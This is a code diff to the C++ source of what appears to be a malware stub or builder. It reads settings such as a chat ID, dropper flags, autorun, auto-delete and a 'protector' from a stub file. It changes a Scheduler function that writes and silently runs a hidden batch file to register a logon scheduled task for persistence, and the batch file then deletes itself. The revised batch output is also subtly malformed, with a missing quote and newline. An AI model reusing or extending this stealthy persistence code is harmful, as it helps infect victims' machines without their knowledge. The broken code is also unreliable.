@@ -39,17 +39,19 @@ void Manager::ReadData(Settings* s) {
 
 	stub.read((char*)&s->chatid, sizeof(s->chatid));
 	stub.read((char*)&s->drop, sizeof(s->drop));
-	stub.read((char*)&s->drop_run, sizeof(bool));
+	stub.read((char*)&s->drop_run, sizeof(s->drop_run));
 
 	stub.read((char*)&s->scheduler_name, sizeof(s->scheduler_name));
-	stub.read((char*)&s->scheduler_state, sizeof(bool));
+	stub.read((char*)&s->scheduler_state, sizeof(s->scheduler_state));
 
 	stub.read((char*)&s->client_delay, sizeof(s->client_delay));
 	stub.read((char*)&s->autorun, sizeof(s->autorun));
-	stub.read((char*)&s->autorun_state, sizeof(bool));
+	stub.read((char*)&s->autorun_state, sizeof(s->autorun_state));
 
-	stub.read((char*)&s->auto_delete, sizeof(bool));
-	stub.read((char*)&s->protector, sizeof(bool));
+	stub.read((char*)&s->auto_delete, sizeof(s->auto_delete));
+
+	stub.read((char*)&s->protector, sizeof(s->protector));
+	stub.read((char*)&s->protectorName, sizeof(s->protectorName));
 
 	stub.close();
 }
@@ -65,14 +67,13 @@ void Manager::Autorun(const char* path, const char* name) {
 }
 
 void Manager::Scheduler(const char* path, const char* name) {
-	std::ofstream schd("scheduler.bat");
+	std::ofstream schd(BAT_SCHD);
 	schd << "@echo off \n";
 	schd << "SCHTASKS /CREATE /SC ONLOGON /TN \"" + std::string(name) + "\" /TR \"" + std::string(path);
+	schd << "DEL" BAT_SCHD;
 	schd.close();
 
-	ShellExecuteA(0, "open", "scheduler.bat", 0, 0, SW_HIDE);
-	Sleep(2000);
-	DeleteFileA("scheduler.bat");
+	ShellExecuteA(0, "open", BAT_SCHD, 0, 0, SW_HIDE);
 }
 
 long Manager::GetFileSize(const char* filename) {
